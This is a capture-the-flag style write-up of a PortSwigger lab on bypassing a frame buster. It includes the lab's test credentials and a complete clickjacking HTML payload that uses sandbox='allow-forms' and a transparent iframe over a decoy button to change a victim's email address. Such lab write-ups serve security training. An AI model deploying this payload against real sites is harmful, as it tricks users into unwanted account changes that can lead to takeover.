
# Clickjacking with a frame buster script

This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter

Note: The victim will be using Chrome so test your exploit on that browser.

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

References: 

- https://portswigger.net/web-security/clickjacking



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/1.png)

---------------------------------------------

If the user profile is accessed with the parameter “email”, the email field gets populated:



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/2.png)


If we try to use the payload from previous labs we get this error:



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/3.png)

We can add 'sandbox="allow-forms"' to the iframe code to avoid this problem, so we can execute the attack with a payload like this:

```
<head>
	<style>
		#target_website {
			position:relative;
			width:600px;
			height:600px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:600px;
			height:600px;
			z-index:1;
			}
		#btn {
			position:absolute;
			top:440px;
			left:70px;
		}
	</style>
</head>
<body>
	<div id="decoy_website">
	<button id="btn">Click me</button>
	</div>
	<iframe id="target_website" src="https://0a11003f031a6dc080b6033a0090001e.web-security-academy.net/my-account?email=test@test.com" sandbox="allow-forms">
	</iframe>
</body>
```



![img](images/Clickjacking%20with%20a%20frame%20buster%20script/4.png)